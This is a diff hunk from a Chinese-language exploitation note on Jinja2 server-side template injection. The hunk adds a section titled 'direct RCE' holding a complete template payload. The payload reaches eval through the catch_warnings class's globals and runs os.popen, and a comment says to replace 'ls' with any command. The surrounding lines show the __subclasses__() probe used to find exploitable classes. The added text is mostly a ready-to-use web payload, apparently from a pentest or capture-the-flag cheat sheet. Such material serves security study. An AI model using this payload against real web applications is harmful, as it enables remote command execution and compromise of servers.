@@ -95,6 +95,21 @@ your input object基类的子类
 
 ^
 ## **利用**
+直接RCE
+```
+{% for c in [].__class__.__base__.__subclasses__() %} 
+  {% if c.__name__ == 'catch_warnings' %} 
+    {% for b in c.__init__.__globals__.values() %} 
+      {% if b.__class__ == {}.__class__ %}
+        {% if 'eval' in b.keys() %} 
+          {{ b['eval']('__import__("os").popen("ls").read()') }}    //这里的ls就是需要的执行命令
+        {% endif %} 
+      {% endif %} 
+     {% endfor %} 
+  {% endif %}
+{% endfor %}
+```
+
 若经过{{''.__class__.__base__.__subclasses__()}}查询存在的类和位置后，可以借助的类反射调用方法：
 ```
 <class 'warnings.catch_warnings'>，没有内置os模块可能在第59位。可以导入后命令执行。
